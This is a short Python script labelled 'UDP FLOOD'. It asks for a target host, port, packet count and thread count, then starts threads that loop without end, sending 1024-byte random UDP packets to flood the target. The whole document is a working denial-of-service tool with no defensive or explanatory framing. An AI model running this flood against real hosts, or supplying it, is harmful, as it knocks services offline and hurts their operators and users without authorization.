
import random
import socket
import threading

print("#-- UDP FLOOD --#")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))

times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")



for y in range(threads):
	th = threading.Thread(target = run)
	th.start()
	
